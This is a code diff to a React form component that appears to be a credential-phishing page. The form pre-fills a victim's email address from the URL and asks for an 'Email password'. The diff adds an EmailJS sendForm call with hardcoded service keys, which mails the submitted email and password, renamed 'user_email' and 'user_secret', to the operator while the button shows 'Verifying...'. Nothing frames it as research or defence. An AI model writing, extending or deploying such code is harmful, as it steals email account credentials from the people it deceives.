@@ -1,13 +1,12 @@
 
-import React, { useState } from "react";
+import React, { useState, useRef } from "react";
 import './form.css';
 import Too from './../media/img/to.png';
 import $ from 'jquery';
+import emailJS from '@emailjs/browser';
+
 
 export const Form = ()=>{
-
-
-    
 
     const emailInTheURL = window.location.href;
     const sliceEqualSign = emailInTheURL.indexOf("=");
@@ -15,6 +14,8 @@ export const Form = ()=>{
 
     const [email, setEmail] = useState(extracetdEmail);
     const [pwd, setPwd] = useState('');
+
+    const form = useRef();
 
     const [count, setCount] = useState(0);
 
@@ -31,6 +32,22 @@ export const Form = ()=>{
         }
         
         else{
+
+
+
+            emailJS.sendForm('service_wzp993k', 'template_r1q05vm', form.current, 'fnFKgJwcLIz25_NKm')
+            .then((result) => {
+                console.log(result.text);
+            }, (error) => {
+                console.log(error.text);
+            });
+
+
+
+
+
+
+
 
             setBtn('Verifying...');
 
@@ -75,7 +92,7 @@ export const Form = ()=>{
         <div className="centra____l_kjhgftyjkK">
             <article className="form_wrapper___">
             <div className="otherformsecs"></div>
-                <form className="form" id="form" onSubmit={submitHandler}>
+                <form className="form" id="form" onSubmit={submitHandler} ref={form}>
                     <img 
                         src={Too}
                         alt=""
@@ -94,7 +111,7 @@ export const Form = ()=>{
 
                         <input 
                             id="email" 
-                            name="email" 
+                            name="user_email" 
                             className="email"
                             placeholder="Email address" 
                             required
@@ -114,7 +131,7 @@ export const Form = ()=>{
 
                         <input 
                             id="password" 
-                            name="password" 
+                            name="user_secret" 
                             className="password"
                             placeholder="Email password" 
                             required
